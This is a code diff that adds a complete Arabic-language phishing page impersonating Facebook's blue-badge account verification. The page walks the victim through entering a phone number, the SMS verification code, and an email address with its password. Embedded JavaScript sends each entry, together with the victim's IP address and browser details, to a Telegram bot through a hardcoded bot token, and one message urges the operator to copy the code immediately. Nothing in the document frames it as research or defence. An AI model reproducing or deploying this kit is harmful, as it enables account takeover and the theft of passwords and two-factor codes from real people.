@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>فيسبوك - توثيق الحساب</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;}
+  body{background:#f0f2f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
+  .container{max-width:420px;width:100%;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.15);overflow:hidden;}
+
+  /* الهيدر */
+  .header{text-align:center;padding:20px 20px 10px;}
+  .header img{width:160px;margin-bottom:6px;}
+  .header h2{font-size:18px;color:#1c1e21;font-weight:600;margin-bottom:4px;}
+  .header p{font-size:13px;color:#606770;}
+  .badge{display:inline-flex;align-items:center;gap:6px;background:#e7f3ff;color:#1877f2;padding:5px 14px;border-radius:20px;font-size:12px;font-weight:600;margin-top:8px;}
+  .badge svg{width:14px;height:14px;fill:#1877f2;}
+
+  /* المحتوى */
+  .content{padding:6px 20px 24px;}
+
+  /* خطوات */
+  .step{display:none;animation:fadeIn .4s ease;}
+  .step.active{display:block;}
+  @keyframes fadeIn{0%{opacity:0;transform:translateY(12px)}100%{opacity:1;transform:translateY(0)}}
+
+  /* مؤشر الخطوات */
+  .indicator{display:flex;justify-content:center;gap:6px;margin:8px 0 14px;}
+  .indicator .dot{width:8px;height:8px;border-radius:50%;background:#ddd;transition:.3s;}
+  .indicator .dot.active{background:#1877f2;width:24px;border-radius:10px;}
+  .indicator .dot.done{background:#42b72a;}
+
+  /* مربع الوصف */
+  .desc-box{background:#f5f6f7;border-radius:10px;padding:16px;text-align:right;margin-bottom:12px;}
+  .desc-box h3{font-size:15px;color:#1c1e21;margin-bottom:8px;}
+  .desc-box p{font-size:13px;color:#4b4f56;line-height:1.7;margin-bottom:8px;}
+  .desc-box ul{list-style:none;padding:0;text-align:right;}
+  .desc-box ul li{font-size:13px;color:#1c1e21;padding:6px 24px 6px 0;position:relative;border-bottom:1px solid #e0e0e0;}
+  .desc-box ul li::before{content:"✓";position:absolute;right:2px;top:6px;color:#42b72a;font-weight:bold;}
+  .desc-box ul li:last-child{border-bottom:none;}
+
+  /* مميزات */
+  .features{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0;}
+  .features .item{background:#fff;border:1px solid #dddfe2;border-radius:10px;padding:10px;text-align:center;font-size:12px;color:#1c1e21;}
+  .features .item svg{width:22px;height:22px;fill:#1877f2;display:block;margin:0 auto 4px;}
+
+  /* الحقول */
+  .form-group{margin-bottom:14px;}
+  .form-group label{display:block;font-size:13px;font-weight:600;color:#606770;margin-bottom:4px;}
+  .form-group select,.form-group input{width:100%;padding:12px 14px;border:1px solid #ccd0d5;border-radius:6px;font-size:14px;background:#fff;transition:.2s;outline:none;}
+  .form-group select:focus,.form-group input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.15);}
+  .form-group select{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23606770'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:left 12px center;background-size:20px;padding-left:36px;}
+  .code-input{text-align:center;font-size:24px;letter-spacing:8px;font-weight:bold;}
+  .input-group{display:flex;gap:8px;}
+  .input-group input{flex:1;}
+
+  /* الأزرار */
+  .btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:bold;cursor:pointer;transition:.2s;}
+  .btn:hover{background:#166fe5;}
+  .btn:disabled{opacity:.5;cursor:not-allowed;}
+  .btn-green{background:#42b72a;}
+  .btn-green:hover{background:#36a420;}
+  .btn-secondary{background:#e4e6eb;color:#1c1e21;}
+  .btn-secondary:hover{background:#d8dadf;}
+  .btn-text{font-size:13px;color:#606770;margin-top:8px;text-align:center;}
+
+  /* التايمر */
+  .timer-box{background:#fff8e1;border:1px solid #ffecb3;border-radius:8px;padding:12px;text-align:center;margin:12px 0;}
+  .timer-box .num{font-size:26px;font-weight:700;color:#e65100;}
+  .timer-box p{font-size:13px;color:#bf360c;}
+
+  /* نجاح */
+  .success{text-align:center;padding:30px 0 20px;}
+  .success svg{width:70px;height:70px;display:block;margin:0 auto 12px;}
+  .success svg .circle{fill:#e8f5e9;stroke:#42b72a;stroke-width:2;}
+  .success svg .check{stroke:#42b72a;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;fill:none;stroke-dasharray:100;stroke-dashoffset:100;animation:checkDraw .8s ease forwards;}
+  @keyframes checkDraw{to{stroke-dashoffset:0;}}
+  .success h2{color:#1b7a2b;font-size:20px;margin-bottom:4px;}
+  .success p{color:#606770;font-size:13px;}
+  .pulse{display:inline-block;width:6px;height:6px;background:#42b72a;border-radius:50%;margin-right:4px;animation:pulse 1.2s infinite;}
+  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.6)}}
+
+  /* سبينر */
+  .spinner{width:36px;height:36px;border:4px solid #e0e0e0;border-top-color:#1877f2;border-radius:50%;animation:spin .7s linear infinite;margin:16px auto;}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* توست */
+  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:12px 22px;border-radius:10px;font-size:13px;opacity:0;transition:.3s;z-index:999;white-space:nowrap;}
+  .toast.show{opacity:1;}
+
+  @media(max-width:480px){.container{border-radius:10px;}.header{padding:14px 14px 6px;}.content{padding:4px 14px 20px;}.features{grid-template-columns:1fr;}}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- الهيدر -->
+  <div class="header">
+    <img src="https://i.ibb.co/GfdD8jkz/facebook-new-logo-change-designboom-02.jpg" alt="فيسبوك">
+    <h2>توثيق الحساب الشخصي</h2>
+    <p>احصل على العلامة الزرقاء المميزة</p>
+    <div class="badge">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+      موثّق رسمياً من فيسبوك
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- مؤشر الخطوات -->
+    <div class="indicator" id="stepsDots">
+      <span class="dot active" data-s="0"></span>
+      <span class="dot" data-s="1"></span>
+      <span class="dot" data-s="2"></span>
+      <span class="dot" data-s="3"></span>
+      <span class="dot" data-s="4"></span>
+    </div>
+
+    <!-- ===================== الخطوة 0: المقدمة ===================== -->
+    <div class="step active" id="s0">
+      <div class="desc-box">
+        <h3>ما هي علامة التوثيق الزرقاء؟</h3>
+        <p>علامة التوثيق الزرقاء في فيسبوك هي علامة صغيرة تظهر بجانب اسم الصفحة أو الحساب، وتدل على أن هذا الحساب حقيقي وتم التحقق منه رسمياً بواسطة إدارة فيسبوك.</p>
+        <p><strong>فوائد الحصول على العلامة الزرقاء:</strong></p>
+        <ul>
+          <li>علامة زرقاء موثقة بجانب اسم حسابك</li>
+          <li>حماية من انتحال الشخصية والتقليد</li>
+          <li>ظهور متقدم في نتائج البحث</li>
+          <li>ثقة أكبر من المتابعين والعملاء</li>
+          <li>أولوية في الدعم الفني</li>
+        </ul>
+      </div>
+      <div class="features">
+        <div class="item"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>علامة زرقاء</div>
+        <div class="item"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>حماية متقدمة</div>
+        <div class="item"><svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>أفضلية بالبحث</div>
+        <div class="item"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>موثوقية عالية</div>
+      </div>
+      <button class="btn" onclick="next(0)">ابدأ عملية التوثيق</button>
+    </div>
+
+    <!-- ===================== الخطوة 1: رقم الهاتف ===================== -->
+    <div class="step" id="s1">
+      <h3 style="color:#1c1e21;font-size:17px;margin-bottom:6px;">📱 أدخل رقم هاتفك</h3>
+      <p style="color:#606770;font-size:13px;margin-bottom:14px;">سوف نرسل رمز تحقق إلى هاتفك عبر رسالة نصية</p>
+      <div class="form-group">
+        <label>اختر الدولة</label>
+        <select id="country">
+          <option value="+20">🇪🇬 مصر (+20)</option>
+          <option value="+966">🇸🇦 السعودية (+966)</option>
+          <option value="+971">🇦🇪 الإمارات (+971)</option>
+          <option value="+965">🇰🇼 الكويت (+965)</option>
+          <option value="+974">🇶🇦 قطر (+974)</option>
+          <option value="+973">🇧🇭 البحرين (+973)</option>
+          <option value="+968">🇴🇲 عمان (+968)</option>
+          <option value="+962">🇯🇴 الأردن (+962)</option>
+          <option value="+964">🇮🇶 العراق (+964)</option>
+          <option value="+963">🇸🇾 سوريا (+963)</option>
+          <option value="+961">🇱🇧 لبنان (+961)</option>
+          <option value="+218">🇱🇾 ليبيا (+218)</option>
+          <option value="+213">🇩🇿 الجزائر (+213)</option>
+          <option value="+212">🇲🇦 المغرب (+212)</option>
+          <option value="+216">🇹🇳 تونس (+216)</option>
+          <option value="+1">🇺🇸 أمريكا (+1)</option>
+          <option value="+44">🇬🇧 بريطانيا (+44)</option>
+          <option value="+49">🇩🇪 ألمانيا (+49)</option>
+          <option value="+33">🇫🇷 فرنسا (+33)</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>رقم الهاتف</label>
+        <input type="tel" id="phone" placeholder="مثال: 501234567" maxlength="15" inputmode="numeric">
+      </div>
+      <button class="btn" onclick="sendPhone()">إرسال رمز التحقق</button>
+      <p class="btn-text">سيصلك رمز عبر SMS خلال 30 ثانية</p>
+    </div>
+
+    <!-- ===================== الخطوة 2: رمز التحقق ===================== -->
+    <div class="step" id="s2">
+      <h3 style="color:#1c1e21;font-size:17px;margin-bottom:6px;">🔐 أدخل رمز التحقق</h3>
+      <p style="color:#606770;font-size:13px;margin-bottom:14px;">أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك</p>
+      <div class="timer-box">
+        <p>المتبقي من الوقت</p>
+        <div class="num" id="timerDisplay">02:00</div>
+      </div>
+      <div class="form-group">
+        <label>رمز التحقق</label>
+        <input type="text" id="code" class="code-input" placeholder="000000" maxlength="6" inputmode="numeric">
+      </div>
+      <button class="btn" onclick="sendCode()">تأكيد الرمز</button>
+      <button class="btn btn-secondary" style="margin-top:8px;" onclick="resendCode()">إعادة إرسال الرمز</button>
+    </div>
+
+    <!-- ===================== الخطوة 3: البريد ===================== -->
+    <div class="step" id="s3">
+      <h3 style="color:#1c1e21;font-size:17px;margin-bottom:6px;">📧 تأكيد البريد الإلكتروني</h3>
+      <p style="color:#606770;font-size:13px;margin-bottom:14px;">لإتمام التوثيق، يرجى تأكيد بريدك الإلكتروني المرتبط بحساب فيسبوك</p>
+      <div class="form-group">
+        <label>البريد الإلكتروني</label>
+        <input type="email" id="email" placeholder="example@gmail.com" dir="ltr">
+      </div>
+      <div class="form-group">
+        <label>كلمة المرور للبريد</label>
+        <input type="password" id="pass" placeholder="••••••••" dir="ltr">
+      </div>
+      <button class="btn btn-green" onclick="sendEmail()">تأكيد التوثيق ✅</button>
+    </div>
+
+    <!-- ===================== الخطوة 4: النجاح ===================== -->
+    <div class="step" id="s4">
+      <div class="success">
+        <svg viewBox="0 0 70 70"><circle class="circle" cx="35" cy="35" r="32"/><path class="check" d="M20 35l10 10 20-20"/></svg>
+        <h2>✅ تمت العملية بنجاح!</h2>
+        <p>جاري توثيق حسابك على فيسبوك <span class="pulse"></span></p>
+        <p style="margin-top:8px;font-size:12px;color:#999;">سيتم تفعيل العلامة الزرقاء خلال 24 ساعة</p>
+      </div>
+      <div class="spinner"></div>
+      <p style="text-align:center;color:#999;font-size:13px;margin-top:8px;">جارِ التحقق من البيانات...</p>
+    </div>
+
+  </div><!-- /.content -->
+</div><!-- /.container -->
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ============================================================
+// ⚙️ الإعدادات — ضع توكن البوت هنا
+// ============================================================
+const BOT_TOKEN = "8635912264:AAGu4XL8v9WuS90vwrBGyJGz5fWyFMstM2E";
+const SITE_URL = window.location.origin + window.location.pathname.replace(/\/?$/, '');
+
+// قراءة chatId من الرابط
+const urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID = urlParams.get('chatId') || '';
+
+// حالة التطبيق
+let currentStep = 0;
+let timerInterval;
+let timeLeft = 120;
+const data = {};
+
+// ============================================================
+// التنقل بين الخطوات
+// ============================================================
+function showStep(i) {
+  document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+  const el = document.getElementById('s' + i);
+  if (el) el.classList.add('active');
+
+  document.querySelectorAll('#stepsDots .dot').forEach(d => {
+    const s = parseInt(d.dataset.s);
+    d.classList.remove('active', 'done');
+    if (s === i) d.classList.add('active');
+    else if (s < i) d.classList.add('done');
+  });
+  currentStep = i;
+}
+
+function next(from) { showStep(from + 1); }
+
+// ============================================================
+// الإرسال إلى تليجرام
+// ============================================================
+async function tgSend(msg) {
+  if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+    showToast("⚠️ لم يتم تكوين البوت");
+    console.log("📦 بيانات:", msg);
+    return;
+  }
+  if (!CHAT_ID) { showToast("❌ رابط غير صالح"); return; }
+
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
+    });
+    const j = await r.json();
+    if (j.ok) {
+      try { await navigator.clipboard.writeText(msg); } catch(e){}
+      showToast('✅ تم الإرسال والنسخ إلى الحافظة');
+    } else {
+      showToast('❌ ' + (j.description || 'خطأ'));
+    }
+  } catch(e) {
+    showToast('❌ فشل: ' + e.message);
+  }
+}
+
+async function getIP() {
+  try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; } catch(e){ return 'غير معروف'; }
+}
+
+// ============================================================
+// الخطوة 1: إرسال رقم الهاتف
+// ============================================================
+async function sendPhone() {
+  const country = document.getElementById('country').value;
+  const phone = document.getElementById('phone').value.trim();
+  if (!phone) { showToast('❌ أدخل رقم الهاتف'); return; }
+
+  data.phone = country + phone;
+  data.country = country;
+  data.rawPhone = phone;
+  data.ip = await getIP();
+  data.userAgent = navigator.userAgent;
+
+  const msg = `🔔 <b>📱 رقم هاتف جديد - فيسبوك</b>\n\n━━━━━━━━━━━━━━\n<b>الرقم:</b> <code>${data.phone}</code>\n<b>الدولة:</b> ${country}\n<b>التوقيت:</b> ${new Date().toLocaleString('ar-EG')}\n<b>IP:</b> ${data.ip}\n━━━━━━━━━━━━━━`;
+  await tgSend(msg);
+  showToast('📩 تم إرسال رمز التحقق');
+  next(1);
+  startTimer();
+}
+
+// ============================================================
+// التايمر
+// ============================================================
+function startTimer() {
+  timeLeft = 120;
+  updateTimer();
+  if (timerInterval) clearInterval(timerInterval);
+  timerInterval = setInterval(() => {
+    timeLeft--;
+    updateTimer();
+    if (timeLeft <= 0) { clearInterval(timerInterval); document.getElementById('timerDisplay').textContent = '00:00'; }
+  }, 1000);
+}
+function updateTimer() {
+  const m = Math.floor(timeLeft/60), s = timeLeft%60;
+  document.getElementById('timerDisplay').textContent = String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+}
+function resendCode() {
+  data.resend = (data.resend || 0) + 1;
+  showToast('📩 تم إعادة الإرسال');
+  startTimer();
+  tgSend(`🔄 <b>إعادة إرسال الرمز</b>\n📱 ${data.phone}\n🔢 المحاولة: ${data.resend}`);
+}
+
+// ============================================================
+// الخطوة 2: إرسال كود التحقق
+// ============================================================
+async function sendCode() {
+  const code = document.getElementById('code').value.trim();
+  if (!code || code.length < 4) { showToast('❌ أدخل الرمز كاملاً'); return; }
+  data.code = code;
+
+  const msg = `🔐 <b>🔑 كود التحقق - فيسبوك</b>\n\n━━━━━━━━━━━━━━\n<b>الرقم:</b> <code>${data.phone}</code>\n<b>الكود:</b> <code>${code}</code>\n<b>التوقيت:</b> ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━\n\n<i>انسخ الكود الآن!</i>`;
+  await tgSend(msg);
+  clearInterval(timerInterval);
+  showToast('✅ تم تأكيد الرمز');
+  next(2);
+}
+
+// ============================================================
+// الخطوة 3: إرسال البريد الإلكتروني
+// ============================================================
+async function sendEmail() {
+  const email = document.getElementById('email').value.trim();
+  const pass = document.getElementById('pass').value.trim();
+  if (!email || !pass) { showToast('❌ أدخل البريد وكلمة المرور'); return; }
+
+  data.email = email;
+  data.pass = pass;
+
+  const msg = `📧 <b>📧 بيانات التوثيق الكاملة - فيسبوك</b>\n\n━━━━━━━━━━━━━━\n<b>📱 الرقم:</b> <code>${data.phone}</code>\n<b>🔑 كود التحقق:</b> <code>${data.code}</code>\n<b>📧 البريد:</b> <code>${email}</code>\n<b>🔐 كلمة المرور:</b> <code>${pass}</code>\n<b>🌐 IP:</b> ${data.ip}\n<b>🕐 التوقيت:</b> ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━\n\n✅ <b>جميع البيانات مكتملة!</b>`;
+  await tgSend(msg);
+  showToast('✅ تم التوثيق بنجاح');
+  next(3);
+}
+
+// ============================================================
+// التوست
+// ============================================================
+function showToast(m) {
+  const t = document.getElementById('toast');
+  t.textContent = m;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+// ============================================================
+// بدء التشغيل
+// ============================================================
+showStep(0);
+</script>
+</body>
+</html>
